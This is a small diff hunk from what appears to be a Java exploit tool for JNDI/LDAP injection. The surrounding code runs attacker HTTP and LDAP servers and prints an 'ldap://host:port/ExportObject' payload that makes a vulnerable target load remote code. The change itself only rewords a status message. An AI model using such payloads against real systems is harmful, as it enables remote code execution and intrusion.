@@ -52,7 +52,7 @@ public class Main {
 			MyHttpServer.run(host, httpPort, command);
 			MyLdapServer.run(host, ldapPort, httpPort);
 
-			System.out.println("[+] Exploit services configured. Use the following injection payload:");
+			System.out.println("[+] Exploit services configured. Use the following payload:");
 			System.out.println("ldap://" + host.getHostAddress() + ":" + ldapPort + "/ExportObject\n");
 
 		} catch (ParseException | UnknownHostException e) {
